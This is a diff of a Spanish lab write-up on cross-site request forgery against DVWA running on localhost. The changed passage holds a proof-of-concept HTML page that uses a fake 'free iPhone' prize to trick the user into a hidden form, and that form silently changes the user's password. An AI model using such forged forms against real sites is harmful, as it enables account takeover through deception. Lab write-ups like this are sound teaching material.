@@ -528,7 +528,7 @@ Guardamos el archivo como dvwa_csrf_high_poc.html:
     <p>Has sido seleccionado para reclamar un <strong>iPhone 15 Pro Max GRATIS</strong>.</p>
     <p>Haz clic en el botón para confirmar tu premio.</p>
 
-    <form action="http://127.0.0.1:8080/dvwa/vulnerabilities/csrf/" method="POST">
+    <form action="http://127.0.0.1:8080/vulnerabilities/csrf/" method="POST">
       <input type="hidden" name="password_new" value="hacked4">
       <input type="hidden" name="password_conf" value="hacked4">
       <input type="hidden" name="Change" value="Change">
@@ -551,17 +551,17 @@ python3 -m http.server 9000
 
 <img width="485" height="62" alt="imagen" src="https://github.com/user-attachments/assets/d951eaa5-1733-4784-96a3-e3f5feab4be2" />
 
-
 Y visitamos en el navegador:
 
 ```codigo
 http://127.0.0.1:8080/dvwa_csrf_high_poc.html
 ```
 
+<img width="563" height="386" alt="imagen" src="https://github.com/user-attachments/assets/bdbdfd9b-277e-416d-94a4-f3b6f826a214" />
+
+Para, finalmente tras apretar el bóton, nos redigire a la página original y vemos que la contraseña ha sido cambiada:
+
 <img width="631" height="263" alt="imagen" src="https://github.com/user-attachments/assets/067d7612-321a-41f8-a56f-78f1e0c40534" />
-
-Como observamos, la contraseña ha sido también modificada en High.
-
 
 ## ✅ Mitigaciones
 
